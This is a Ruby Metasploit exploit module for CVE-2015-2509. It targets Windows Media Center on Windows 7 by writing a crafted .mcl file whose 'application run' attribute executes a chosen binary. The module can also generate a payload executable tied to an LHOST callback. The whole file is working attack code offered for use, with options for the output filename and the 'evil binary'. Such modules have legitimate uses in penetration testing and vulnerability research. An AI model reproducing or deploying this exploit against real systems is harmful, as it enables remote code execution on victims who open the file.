##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Windows Media Center - Command Execution',
      'Description'    => %q{
        This module exploits an command execution vulnerability in Windows Media Center on Windows.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Microsoft',                         
          'R-73eN',  # public exploit
          # Metasploit version by:
          'Pablo'
        ],
      'References'     =>
        [
          [ 'CVE', '2015-2509' ],
          [ 'BID', '38151' ],
          [ 'URL', 'https://www.exploit-db.com/exploits/38151/' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
          'InitialAutoRunScript' => 'migrate -f',
        },
      'Payload'        =>
        {
          'Space'         => 1024,
          'BadChars'      => "\x00",
          'DisableNops'	 => true
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows Media Center on Windows 7',
            {
              #
            }
          ],
        ],
      'DisclosureDate' => '11 Sept 2015',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ true, 'The file name',  'msf.mcl']),
		OptString.new('PoC_BINARY', [ false, 'Proof of Concept: calc.exe','calc.exe']),
		OptEnum.new('PoC', [ false, 'Execution type','FALSE',['FALSE', 'TRUE']]),
		OptString.new('EXE', [ false, 'Create a evil binary file', 'msf.exe']),
      ], self.class)

  end

  def exploit

	if datastore['PoC'] == 'FALSE'
		print_status("Creating '#{datastore['FILENAME']}' file...")
	else	
		m = framework.modules.create(datastore['PAYLOAD'])
		m.datastore['LHOST'] = datastore['LHOST']
		#f = m.generate_simple('Format'=>'exe','Keep'=>'true')
		buf = m.generate_simple('Format' => 'exe')
		ofile = datastore['EXE']
		print_status("Writing #{buf.length} bytes to #{ofile}...")
		fd = File.open(ofile, "wb")
		fd.write(buf)
		fd.close
    end
		
	mcl = make_poc_mcl
	print_status("Created:#{mcl}")
	file_create(mcl)
  end
  
  def make_poc_mcl
	m = "<application run=\"#{datastore['PoC_BINARY']}\"/>"
	return m
  end

end
